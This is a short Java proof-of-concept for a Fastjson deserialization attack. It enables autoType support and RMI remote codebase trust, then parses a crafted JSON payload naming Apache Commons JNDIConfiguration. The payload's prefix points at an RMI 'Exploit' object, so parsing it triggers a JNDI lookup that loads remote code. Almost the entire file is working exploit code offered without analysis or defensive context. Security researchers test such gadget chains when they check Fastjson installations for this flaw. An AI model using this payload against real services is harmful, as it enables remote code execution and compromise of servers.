package poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.IOException;

public class CommonsConfiguration {

    static {
        //JDK 8u121以后版本需要设置改系统变量
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    }

    public static void main(String[] args) throws Exception{
        fastjson();
//        org.apache.commons.configuration.JNDIConfiguration
    }


    static void fastjson(){
        String json;
        json = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1389/Exploit\"}";
        Object object = JSON.parseObject(json);
        System.out.println("type:"+ object.getClass().getName() +" "+ object);
    }


}
